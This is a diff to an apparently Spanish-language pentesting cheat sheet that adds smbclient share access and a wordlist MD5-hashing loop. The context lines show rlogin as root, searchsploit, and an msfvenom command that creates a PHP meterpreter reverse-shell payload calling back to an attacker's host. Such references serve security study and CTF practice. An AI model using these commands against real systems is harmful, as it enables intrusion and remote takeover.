@@ -132,6 +132,8 @@ gcc -pthread (archivo.c) -o (nombre del archivo a compilar) -lcrypt [compila un 
 
 rlogin -l root (ip) [intenta iniciar una sesión remota en otro sistema utilizando el usuario root]
 
+smbclient //ip/nombreServidor -U (usuario) [permite acceder a recursos compartidos en servidores que usan el protocolo SMB se puede navegar por directorios, descargar y subir archivos entre tu máquina y un servidor remoto]
+
 searchsploit (nombre del exploit) [busca posibles exploits]
 
 msfvenom -p php/meterpreter_reverse_tcp LHOST=(ip) LPORT=(puerto) -f raw > archivo.php [crea un archivo PHP malicioso que al subirlo se conecta a tu IP y puerto para darte control remoto del sistema]
@@ -281,6 +283,8 @@ ftp (ip) [es un protocolo de transferencia de archivos que permite a los usuario
 base64 [codificar base64]
 
 base64 -d archivo < archivo1 [decodificar base 64]
+
+for i in $(cat RutaDelWorlist); do echo $i | md5sum >> resultado.txt; done [lee cada línea de un archivo de palabras y guarda en resultado.txt el hash MD5 de cada una, siempre comprobar que no hayan espacios vacios o caracteres de más]
 
 echo “palabra” | base64 [codificar base64]
 
